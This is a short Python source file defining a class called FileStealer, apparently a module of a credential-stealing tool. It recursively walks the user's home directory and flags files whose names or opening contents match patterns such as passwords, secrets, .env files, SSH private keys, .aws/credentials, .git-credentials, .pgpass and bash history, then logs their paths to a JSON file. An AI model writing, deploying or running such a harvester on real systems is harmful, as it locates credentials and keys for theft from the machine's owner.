import os
import re
from pathlib import Path
import json

class FileStealer:
    def __init__(self):
        self.output_file = Path('data/logs/sensitive_files.json')
        self.output_file.parent.mkdir(parents=True, exist_ok=True)
        self.sensitive_patterns = [
            r'password', r'secret', r'credential', r'\.env',
            r'\.ssh/id_', r'\.pgpass', r'\.my\.cnf', r'\.bash_history',
            r'\.git-credentials', r'\.aws/credentials'
        ]

    def find_sensitive_files(self, base_path=None):
        """Recursively search for sensitive files"""
        if base_path is None:
            base_path = str(Path.home())
        
        sensitive_files = []
        
        for root, _, files in os.walk(base_path):
            for file in files:
                file_path = os.path.join(root, file)
                try:
                    # Check filename patterns
                    if any(re.search(pattern, file_path, re.IGNORECASE) 
                          for pattern in self.sensitive_patterns):
                        sensitive_files.append({
                            "path": file_path,
                            "type": "filename_match"
                        })
                        continue
                    
                    # Check file content (small files only)
                    if os.path.getsize(file_path) < 102400:  # 100KB
                        try:
                            with open(file_path, 'r', errors='ignore') as f:
                                content = f.read(4096)  # Read first 4KB
                                if any(re.search(pattern, content, re.IGNORECASE) 
                                      for pattern in self.sensitive_patterns):
                                    sensitive_files.append({
                                        "path": file_path,
                                        "type": "content_match"
                                    })
                        except (UnicodeDecodeError, PermissionError):
                            continue
                except (PermissionError, OSError):
                    continue
        
        with self.output_file.open('w') as f:
            json.dump(sensitive_files, f, indent=2)
        
        return sensitive_files

    def start(self):
        """Start file scanning"""
        self.find_sensitive_files()